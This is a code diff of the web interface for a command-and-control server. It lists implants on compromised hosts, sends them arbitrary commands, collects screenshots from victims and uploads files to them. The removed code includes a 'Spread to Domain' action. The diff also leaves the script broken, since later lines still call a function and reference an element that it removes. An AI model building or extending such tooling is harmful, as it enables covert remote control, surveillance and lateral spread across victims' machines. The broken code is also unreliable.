@@ -3,40 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sims-Attack C2</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>C2 Server Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
     <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='sims.png') }}">
     <style>
         .implant-card {
             margin-bottom: 1rem;
+            transition: all 0.3s ease;
+        }
+        .implant-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }
         .command-output {
             background-color: #1e1e1e;
-            color: #fff;
+            color: #d4d4d4;
             padding: 1rem;
             border-radius: 4px;
-            font-family: monospace;
+            font-family: 'Consolas', monospace;
+            white-space: pre-wrap;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .screenshot-container {
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .screenshot-container img {
+            max-width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+        }
+        .status-active {
+            background-color: #28a745;
+        }
+        .status-inactive {
+            background-color: #dc3545;
+        }
+        .command-history {
             max-height: 300px;
             overflow-y: auto;
         }
-        .status-active {
-            color: #28a745;
-        }
-        .status-disconnected {
-            color: #dc3545;
-        }
-        .screenshot-preview {
-            max-width: 100%;
-            height: auto;
-            margin-top: 1rem;
+        .timestamp {
+            color: #6c757d;
+            font-size: 0.8rem;
         }
     </style>
 </head>
 <body>
     <nav class="navbar navbar-dark bg-dark">
         <div class="container-fluid">
-            <span class="navbar-brand mb-0 h1">Sims-Attack C2</span>
+            <span class="navbar-brand mb-0 h1">C2 Server Dashboard</span>
         </div>
     </nav>
 
@@ -46,11 +72,11 @@
             <div class="col-md-4">
                 <div class="card">
                     <div class="card-header">
-                        <h5 class="card-title mb-0">Active Implants</h5>
+                        <h5 class="card-title mb-0">Connected Implants</h5>
                     </div>
                     <div class="card-body">
                         <div id="implants-list">
-                            <!-- Implants will be added here dynamically -->
+                            <!-- Implants will be dynamically added here -->
                         </div>
                     </div>
                 </div>
@@ -64,40 +90,41 @@
                     </div>
                     <div class="card-body">
                         <div id="selected-implant-info" class="mb-3">
-                            <p class="text-muted">Select an implant to begin</p>
+                            <p class="text-muted">Select an implant to execute commands</p>
                         </div>
                         
-                        <!-- Command Input -->
-                        <div class="mb-3">
+                        <form id="command-form" class="mb-3">
                             <div class="input-group">
                                 <input type="text" id="command-input" class="form-control" placeholder="Enter command...">
-                                <button class="btn btn-primary" id="send-command">Send</button>
+                                <button type="submit" class="btn btn-primary">Execute</button>
                             </div>
-                        </div>
+                        </form>
 
-                        <!-- Quick Actions -->
-                        <div class="mb-3">
-                            <button class="btn btn-secondary" id="take-screenshot">Take Screenshot</button>
-                            <button class="btn btn-secondary" id="spread-domain">Spread to Domain</button>
-                            <div class="btn-group">
-                                <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown">
-                                    File Operations
-                                </button>
-                                <ul class="dropdown-menu">
-                                    <li><a class="dropdown-item" href="#" id="upload-file">Upload File</a></li>
-                                    <li><a class="dropdown-item" href="#" id="download-file">Download File</a></li>
-                                </ul>
+                        <!-- Command History -->
+                        <div class="card mb-3">
+                            <div class="card-header">
+                                <h6 class="mb-0">Command History</h6>
+                            </div>
+                            <div class="card-body">
+                                <div id="command-history" class="command-history">
+                                    <!-- Command history will be dynamically added here -->
+                                </div>
                             </div>
                         </div>
 
                         <!-- Command Output -->
-                        <div class="command-output" id="command-output">
-                            <!-- Command output will be displayed here -->
-                        </div>
-
-                        <!-- Screenshot Preview -->
-                        <div id="screenshot-preview" class="mt-3" style="display: none;">
-                            <img src="" alt="Screenshot" class="screenshot-preview">
+                        <div class="card">
+                            <div class="card-header">
+                                <h6 class="mb-0">Command Output</h6>
+                            </div>
+                            <div class="card-body">
+                                <div id="command-output" class="command-output">
+                                    <!-- Command output will be dynamically added here -->
+                                </div>
+                                <div id="screenshot-container" class="screenshot-container">
+                                    <!-- Screenshots will be displayed here -->
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -157,182 +184,178 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script>
     <script>
-        // Connect to Socket.IO server
         const socket = io();
+        let selectedImplantId = null;
+        const implants = {};
 
-        // Global variables
-        let selectedImplant = null;
-        const implants = new Map();
-
-        // Socket.IO event handlers
+        // Socket event handlers
         socket.on('connect', () => {
-            console.log('Connected to C2 server');
-            fetchImplants();
+            console.log('Connected to server');
         });
 
-        socket.on('implant_status', (data) => {
-            updateImplantStatus(data.implant_id, data.status);
+        socket.on('implants_update', (updatedImplants) => {
+            Object.assign(implants, updatedImplants);
+            updateImplantsList();
         });
 
         socket.on('command_result', (data) => {
-            if (data.implant_id === selectedImplant) {
-                appendCommandOutput(data.result);
-                if (data.command === 'screenshot') {
-                    showScreenshot();
-                }
+            if (data.implant_id === selectedImplantId) {
+                displayCommandResult(data);
             }
         });
 
-        // Fetch implants from server
-        function fetchImplants() {
-            fetch('/api/implants')
-                .then(response => response.json())
-                .then(data => {
-                    const implantsList = document.getElementById('implants-list');
-                    implantsList.innerHTML = '';
-                    implants.clear();
+        socket.on('command_history', (data) => {
+            if (data.implant_id === selectedImplantId) {
+                updateCommandHistory(data.history);
+            }
+        });
 
-                    data.forEach(implant => {
-                        implants.set(implant.id, implant);
-                        addImplantCard(implant);
-                    });
-                })
-                .catch(error => console.error('Error fetching implants:', error));
-        }
-
-        // Add implant card to the list
-        function addImplantCard(implant) {
+        // Update implants list
+        function updateImplantsList() {
             const implantsList = document.getElementById('implants-list');
-            const card = document.createElement('div');
-            card.className = 'card implant-card';
-            card.innerHTML = `
-                <div class="card-body">
-                    <h6 class="card-title">
-                        ${implant.hostname}
-                        <span class="status-badge status-${implant.status || 'disconnected'}">
-                            <i class="fa fa-circle"></i>
-                        </span>
-                    </h6>
-                    <p class="card-text">
-                        <small>IP: ${implant.ip}</small><br>
-                        <small>OS: ${implant.os}</small><br>
-                        <small>User: ${implant.user}</small>
-                    </p>
-                </div>
-            `;
-            card.onclick = () => selectImplant(implant.id);
-            implantsList.appendChild(card);
+            implantsList.innerHTML = '';
+
+            Object.entries(implants).forEach(([id, implant]) => {
+                const card = document.createElement('div');
+                card.className = `card implant-card ${id === selectedImplantId ? 'border-primary' : ''}`;
+                card.innerHTML = `
+                    <div class="card-body">
+                        <h6 class="card-title">
+                            <span class="status-indicator ${implant.connected ? 'status-active' : 'status-inactive'}"></span>
+                            ${implant.hostname || 'Unknown Host'}
+                        </h6>
+                        <p class="card-text">
+                            <small class="text-muted">
+                                IP: ${implant.ip || 'Unknown'}<br>
+                                OS: ${implant.os || 'Unknown'}<br>
+                                User: ${implant.user || 'Unknown'}<br>
+                                Last Activity: ${implant.last_activity || 'None'}<br>
+                                Last Seen: ${new Date(implant.last_seen).toLocaleString()}
+                            </small>
+                        </p>
+                        <button class="btn btn-sm btn-primary select-implant" data-implant-id="${id}">
+                            Select
+                        </button>
+                    </div>
+                `;
+                implantsList.appendChild(card);
+            });
+
+            // Add event listeners to select buttons
+            document.querySelectorAll('.select-implant').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    const implantId = e.target.dataset.implantId;
+                    selectImplant(implantId);
+                });
+            });
         }
 
-        // Select an implant
+        // Select implant
         function selectImplant(implantId) {
-            selectedImplant = implantId;
-            const implant = implants.get(implantId);
+            selectedImplantId = implantId;
+            const implant = implants[implantId];
             
             // Update selected implant info
             document.getElementById('selected-implant-info').innerHTML = `
-                <h6>Selected Implant: ${implant.hostname}</h6>
-                <small>IP: ${implant.ip} | OS: ${implant.os} | User: ${implant.user}</small>
+                <h6>Selected Implant: ${implant.hostname || 'Unknown Host'}</h6>
+                <p class="text-muted">
+                    IP: ${implant.ip || 'Unknown'} | 
+                    OS: ${implant.os || 'Unknown'} | 
+                    User: ${implant.user || 'Unknown'}
+                </p>
             `;
-            
-            // Enable command interface
-            document.getElementById('command-input').disabled = false;
-            document.getElementById('send-command').disabled = false;
-            document.getElementById('take-screenshot').disabled = false;
-            document.getElementById('spread-domain').disabled = false;
-            
+
+            // Update implants list to highlight selected implant
+            updateImplantsList();
+
+            // Get command history
+            socket.emit('get_command_history', { implant_id: implantId });
+
             // Clear command output
             document.getElementById('command-output').innerHTML = '';
-            document.getElementById('screenshot-preview').style.display = 'none';
+            document.getElementById('screenshot-container').innerHTML = '';
         }
 
-        // Update implant status
-        function updateImplantStatus(implantId, status) {
-            const implant = implants.get(implantId);
-            if (implant) {
-                implant.status = status;
-                const card = document.querySelector(`[data-implant-id="${implantId}"]`);
-                if (card) {
-                    const statusBadge = card.querySelector('.status-badge');
-                    statusBadge.className = `status-badge status-${status}`;
-                }
+        // Display command result
+        function displayCommandResult(data) {
+            const outputDiv = document.getElementById('command-output');
+            const screenshotContainer = document.getElementById('screenshot-container');
+            
+            // Clear previous screenshot if any
+            screenshotContainer.innerHTML = '';
+
+            if (data.result.type === 'screenshot') {
+                // Display screenshot
+                const img = document.createElement('img');
+                img.src = `/uploads/${data.result.filename}`;
+                img.alt = 'Screenshot';
+                img.className = 'img-fluid';
+                screenshotContainer.appendChild(img);
+                
+                // Add success message
+                const message = document.createElement('p');
+                message.className = 'text-success mt-2';
+                message.textContent = data.result.message;
+                screenshotContainer.appendChild(message);
+            } else {
+                // Display command output
+                const timestamp = new Date(data.timestamp).toLocaleString();
+                const output = document.createElement('div');
+                output.className = 'mb-2';
+                output.innerHTML = `
+                    <div class="d-flex justify-content-between align-items-center mb-1">
+                        <strong>Command: ${data.command}</strong>
+                        <span class="timestamp">${timestamp}</span>
+                    </div>
+                    <pre class="mb-0">${data.result.message}</pre>
+                `;
+                outputDiv.insertBefore(output, outputDiv.firstChild);
             }
         }
 
-        // Send command to implant
-        function sendCommand(command) {
-            if (!selectedImplant) return;
-            
-            fetch(`/api/implants/${selectedImplant}/command`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ command })
-            })
-            .then(response => response.json())
-            .then(data => {
-                appendCommandOutput(`Command sent: ${command}`);
-            })
-            .catch(error => {
-                appendCommandOutput(`Error: ${error.message}`);
+        // Update command history
+        function updateCommandHistory(history) {
+            const historyDiv = document.getElementById('command-history');
+            historyDiv.innerHTML = '';
+
+            history.forEach(item => {
+                const entry = document.createElement('div');
+                entry.className = 'mb-2';
+                entry.innerHTML = `
+                    <div class="d-flex justify-content-between align-items-center">
+                        <code>${item.command}</code>
+                        <span class="timestamp">${new Date(item.timestamp).toLocaleString()}</span>
+                    </div>
+                `;
+                historyDiv.appendChild(entry);
             });
         }
 
-        // Append text to command output
-        function appendCommandOutput(text) {
-            const output = document.getElementById('command-output');
-            const line = document.createElement('div');
-            line.textContent = text;
-            output.appendChild(line);
-            output.scrollTop = output.scrollHeight;
-        }
-
-        // Take screenshot
-        function takeScreenshot() {
-            if (!selectedImplant) return;
+        // Handle command form submission
+        document.getElementById('command-form').addEventListener('submit', (e) => {
+            e.preventDefault();
             
-            fetch(`/api/implants/${selectedImplant}/screenshot`, {
-                method: 'POST'
-            })
-            .then(response => response.json())
-            .then(data => {
-                appendCommandOutput('Screenshot request sent...');
-            })
-            .catch(error => {
-                appendCommandOutput(`Error: ${error.message}`);
-            });
-        }
+            if (!selectedImplantId) {
+                alert('Please select an implant first');
+                return;
+            }
 
-        // Show screenshot
-        function showScreenshot() {
-            const preview = document.getElementById('screenshot-preview');
-            const img = preview.querySelector('img');
-            img.src = `/uploads/screenshot.png?t=${Date.now()}`;
-            preview.style.display = 'block';
-        }
+            const commandInput = document.getElementById('command-input');
+            const command = commandInput.value.trim();
+            
+            if (command) {
+                socket.emit('execute_command', {
+                    implant_id: selectedImplantId,
+                    command: command
+                });
+                commandInput.value = '';
+            }
+        });
 
         // Event listeners
-        document.getElementById('send-command').addEventListener('click', () => {
-            const input = document.getElementById('command-input');
-            const command = input.value.trim();
-            if (command) {
-                sendCommand(command);
-                input.value = '';
-            }
-        });
-
-        document.getElementById('command-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                document.getElementById('send-command').click();
-            }
-        });
-
-        document.getElementById('take-screenshot').addEventListener('click', takeScreenshot);
-
         document.getElementById('upload-file').addEventListener('click', () => {
             const modal = new bootstrap.Modal(document.getElementById('upload-modal'));
             modal.show();
@@ -346,7 +369,7 @@
             const formData = new FormData();
             formData.append('file', file);
 
-            fetch(`/api/implants/${selectedImplant}/upload`, {
+            fetch(`/api/implants/${selectedImplantId}/upload`, {
                 method: 'POST',
                 body: formData
             })
@@ -375,7 +398,7 @@
             }
 
             // Set environment variables for the implant
-            fetch(`/api/implants/${selectedImplant}/command`, {
+            fetch(`/api/implants/${selectedImplantId}/command`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -395,12 +418,6 @@
                 appendCommandOutput(`Error: ${error.message}`);
             });
         });
-
-        // Initialize
-        document.getElementById('command-input').disabled = true;
-        document.getElementById('send-command').disabled = true;
-        document.getElementById('take-screenshot').disabled = true;
-        document.getElementById('spread-domain').disabled = true;
     </script>
 </body>
 </html> 
